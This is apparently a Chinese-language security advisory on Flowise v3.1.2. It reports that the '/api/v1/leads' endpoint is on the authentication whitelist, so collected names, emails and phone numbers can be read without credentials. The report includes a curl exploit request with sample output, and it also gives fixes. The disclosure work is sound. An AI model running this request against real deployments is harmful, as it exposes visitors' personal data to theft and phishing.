# V-F002: Flowise `/api/v1/leads` 未授权 PII 数据泄露

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | Flowise（开源 LLM 流程编排平台）|
| 版本 | v3.1.2（截至 2026-04）|
| 类型 | CWE-359: 隐私泄露 / CWE-306: 关键功能缺少身份验证 |
| 严重程度 | 高危（High）|
| 攻击向量 | 网络（完全未授权）|
| 代码仓库 | https://github.com/flowiseai/flowise |

## 漏洞描述

Flowise 的 Leads 功能允许 Chatbot 收集访客的姓名、邮箱、电话号码等个人信息（PII）。然而查询 Leads 的接口 `/api/v1/leads` 被错误地加入了认证白名单，任何人无需任何凭据即可访问并获取所有收集到的用户数据。

## 漏洞代码

**文件**：`packages/server/src/utils/constants.ts`（第 6-40 行）

```typescript
export const WHITELIST_URLS = [
    '/api/v1/verify/apikey/',
    '/api/v1/prediction/',        // ← 合理：公开 chatbot 对话接口
    '/api/v1/feedback',           // ← 合理：提交反馈
    '/api/v1/leads',              // ⚠️ 不合理：查询 PII 数据也加入白名单
    '/api/v1/ping',
    '/api/v1/version',
    // ...
]
```

**文件**：`packages/server/src/services/leads/index.ts`

```typescript
const getAllLeads = async (chatflowid: string) => {
    const dbResponse = await appServer.AppDataSource.getRepository(Lead).find({
        where: { chatflowid }
    })
    return dbResponse  // 返回：name, email, phone, chatId, createdDate
}
```

## 利用方式

Chatbot 的 `chatflowId` 通常以明文出现在公开嵌入代码中（HTML iframe 或 JS widget），无需猜测：

```html
<!-- 公开 chatbot 页面的嵌入代码 -->
<script>
  window.FlowiseConfig = { chatflowid: "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" }
</script>
```

获取 chatflowId 后，直接无认证访问（chatflowId 作为 URL 路径参数）：

```bash
# 路由：GET /api/v1/leads/:id（packages/server/src/routes/leads/index.ts:9）
# 获取全量 Leads（PII）数据，无需任何认证
curl "http://<target>:3000/api/v1/leads/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
```

```json
[
  {
    "id": "1",
    "chatflowid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
    "name": "张三",
    "email": "zhangsan@company.com",
    "phone": "13800138000",
    "chatId": "session-abc123",
    "createdDate": "2026-04-14T08:00:00Z"
  },
  {
    "id": "2",
    "name": "李四",
    "email": "lisi@example.com",
    "phone": "13900139000",
    ...
  }
]
```

## 受影响文件

| 文件 | 行号 | 问题 |
|------|------|------|
| `packages/server/src/utils/constants.ts` | 20 | `/api/v1/leads` 被加入 `WHITELIST_URLS` |
| `packages/server/src/services/leads/index.ts` | 全文 | `getAllLeads` 直接返回所有 PII 字段 |
| `packages/server/src/database/entities/Lead.ts` | 全文 | `Lead` 实体含 name/email/phone 字段 |

## 影响

1. **GDPR/个人信息保护合规风险**：无需认证即可批量导出用户 PII，可能触犯 GDPR、中国《个人信息保护法》等法规
2. **竞争情报泄露**：企业 chatbot 收集的客户意向信息、联系方式全部暴露
3. **钓鱼攻击素材**：攻击者批量获取真实用户邮箱和电话，可用于定向钓鱼
4. **影响面广**：部署了 Flowise 且启用 Leads 功能的所有实例均受影响

## 修复建议

1. **立即**：从 `WHITELIST_URLS` 中删除 `/api/v1/leads`，要求至少持有有效 API Key
2. **短期**：在 `getAllLeads` 中按 org/workspace 过滤，防止跨租户数据访问
3. **短期**：对 Leads 接口添加速率限制，防止批量爬取
4. **长期**：对 PII 字段（email、phone）在存储前进行加密或哈希处理

## 源代码验证

### 验证1：白名单条目确认

**文件**：`packages/server/src/utils/constants.ts`（第 20 行）

```typescript
export const WHITELIST_URLS = [
    // ...
    '/api/v1/leads',   // ← 第 20 行，直接加入白名单，无任何条件
    // ...
]
```

### 验证2：认证中间件跳过逻辑确认

**文件**：`packages/server/src/index.ts`（认证中间件）

```typescript
// 当 URL 命中 WHITELIST_URLS 时，直接 next()，完全跳过认证
if (isWhitelistedUrl) {
    return next()
}
// ... 以下才是认证逻辑
```

### 验证3：Lead 实体 PII 字段确认

Lead 实体包含：`id`、`chatflowid`、`name`、`email`、`phone`、`chatId`、`createdDate`

## 验证环境

- 源代码：Flowise v3.1.2（静态代码分析）
- 框架：Node.js + Express + TypeORM
- 日期：2026-04-15
